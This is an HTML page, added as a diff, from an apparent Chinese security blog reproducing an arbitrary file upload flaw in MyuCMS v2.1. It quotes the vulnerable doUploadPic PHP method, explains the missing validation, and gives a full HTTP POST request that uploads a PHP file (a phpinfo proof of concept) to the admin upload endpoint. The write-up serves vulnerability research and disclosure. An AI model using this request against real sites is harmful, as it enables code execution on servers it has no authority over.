@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MyuCMS v2.1 文件上传漏洞一、漏洞简介二、漏洞影响MyuCMS v2.1 三、复现过程CNVD 上对应的标题为 myucms fo***.php页面存在文件上传漏洞 搜索项目中fo开头的文件，定位到application&#x2F;admin&#x2F;controller&#x2F;Forum.php 中的 doUploadPic 方法 public function doUploadPic()     &amp;#123">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="MyuCMS v2.1 文件上传漏洞一、漏洞简介二、漏洞影响MyuCMS v2.1 三、复现过程CNVD 上对应的标题为 myucms fo***.php页面存在文件上传漏洞 搜索项目中fo开头的文件，定位到application&#x2F;admin&#x2F;controller&#x2F;Forum.php 中的 doUploadPic 方法 public function doUploadPic()     &amp;#123">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:59.993Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-MyuCMS/MyuCMS v2.1 文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.993Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MyuCMS-v2-1-文件上传漏洞"><a href="#MyuCMS-v2-1-文件上传漏洞" class="headerlink" title="MyuCMS v2.1 文件上传漏洞"></a>MyuCMS v2.1 文件上传漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>MyuCMS v2.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>CNVD 上对应的标题为 <strong>myucms fo***.php页面存在文件上传漏洞</strong></p>
+<p>搜索项目中fo开头的文件，定位到<br><strong>application/admin/controller/Forum.php</strong> 中的 <strong>doUploadPic</strong> 方法</p>
+<pre><code>public function doUploadPic()
+    &#123;
+        $file = request()-&gt;file(&#39;FileName&#39;);
+        $info = $file-&gt;move(ROOT_PATH . DS . &#39;uploads&#39;);
+        if($info)&#123;
+            $path = WEB_URL . DS . &#39;uploads&#39; . DS .$info-&gt;getSaveName();
+            echo str_replace(&quot;\\&quot;,&quot;/&quot;,$path);
+        &#125;
+    &#125;
+</code></pre>
+<p>可以看到上述代码调用了 <strong>Thinkphp</strong> 内置的 <strong>move</strong><br>方法来对上传的文件进行处理。但是在调用 <strong>move</strong> 方法前未调用<br><strong>validate()</strong> 方法来设置验证规则。以至于此处形成了任意文件上传漏洞。</p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>根据 <strong>doUploadPic()</strong> 方法构建 <strong>Payload数据包</strong> 如下：</p>
+<pre><code>POST /admin/forum/doUploadPic HTTP/1.1
+Host: www.0-sec.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: multipart/form-data; boundary=---------------------------18467633426500
+Cookie: PHPSESSID=l6ijpio06mqmhcdq654g63eq90; UM_distinctid=170343d2b4a291-0a4e487f247e62-4c302978-1fa400-170343d2b4b28f; CNZZDATA1277972876=1874892142-1581419669-%7C1581432904
+Upgrade-Insecure-Requests: 1
+Content-Length: 206
+
+-----------------------------18467633426500
+Content-Disposition: form-data; name=&quot;FileName&quot;; filename=&quot;1.php&quot;
+Content-Type: image/jpeg
+
+&lt;?php phpinfo(); ?&gt;
+-----------------------------18467633426500--
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7271/#toc-0">https://xz.aliyun.com/t/7271\#toc-0</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsse00bzy8v17psf18v1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Net__FTP/%EF%BC%88CVE-2017-17405%EF%BC%89Net__FTP%20%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/MyuCMS/MyuCMS%20v2.1%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
